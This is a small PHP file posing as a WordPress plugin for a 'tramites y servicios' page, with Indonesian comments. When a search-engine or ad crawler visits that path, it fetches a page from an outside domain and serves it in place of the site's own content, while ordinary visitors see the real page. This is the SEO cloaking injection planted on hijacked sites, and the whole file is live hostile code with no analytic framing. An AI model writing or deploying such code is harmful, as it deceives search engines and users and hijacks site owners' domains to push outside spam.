<?php
/*
Plugin Name: Bot Handler for Tramites
Description: Menangani request bot untuk /tramites-y-servicios/
*/

function handle_tramites_bot() {
    if (strpos($_SERVER['REQUEST_URI'], '/tramites-y-servicios/') !== false) {
        
        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        $bots = array('googlebot', 'slurp', 'adsense', 'inspection', 'ahrefsbot', 'telegrambot', 'bingbot', 'yandexbot');
        
        foreach ($bots as $bot) {
            if (strpos($user_agent, $bot) !== false) {
                // Ambil konten eksternal
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://kingstechhub.com/lp/flight-to-the-moon.html');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                $response = curl_exec($ch);
                curl_close($ch);
                
                if ($response) {
                    echo $response;
                    exit;
                }
                break;
            }
        }
    }
}

add_action('init', 'handle_tramites_bot', 1);
?>
